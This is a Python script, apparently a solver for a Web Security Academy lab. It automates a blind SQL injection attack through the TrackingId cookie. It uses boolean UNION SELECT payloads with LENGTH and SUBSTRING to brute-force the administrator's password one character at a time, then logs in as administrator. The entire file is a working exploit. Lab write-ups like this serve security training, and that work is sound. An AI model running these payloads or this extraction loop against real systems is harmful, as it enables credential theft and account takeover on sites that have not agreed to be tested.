from web_security_academy.core.utils import *
from bs4 import BeautifulSoup
import string


def solve_lab(session):
    print_info(
        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND LENGTH(password)=\033[1;93m?\033[00m --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND LENGTH(password)={len_pass} --"
        }
        resp = session.get_path("/", cookies=cookies)
        soup = BeautifulSoup(resp.text, "html.parser")
        welcome_back = soup.find(string="Welcome back!")

        if welcome_back is None:
            print_info_secondary(f"{len_pass} => False", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => True \n")
            break

    print_info(
        f'Determining administrator password by visting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND SUBSTRING(password, \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password, {i+1}, 1)='{c}' --"
            }
            resp = session.get_path("/", cookies=cookies)
            soup = BeautifulSoup(resp.text, "html.parser")
            welcome_back = soup.find(string="Welcome back!")

            if welcome_back is None:
                print_info_secondary(
                    f"{i+1}, '{c}' => False | Progress: {password}...", end=""
                )
            else:
                print_success(
                    f"{i+1}, '{c}' => True  | Progress: {password}...", end=""
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    session.login("administrator", password)
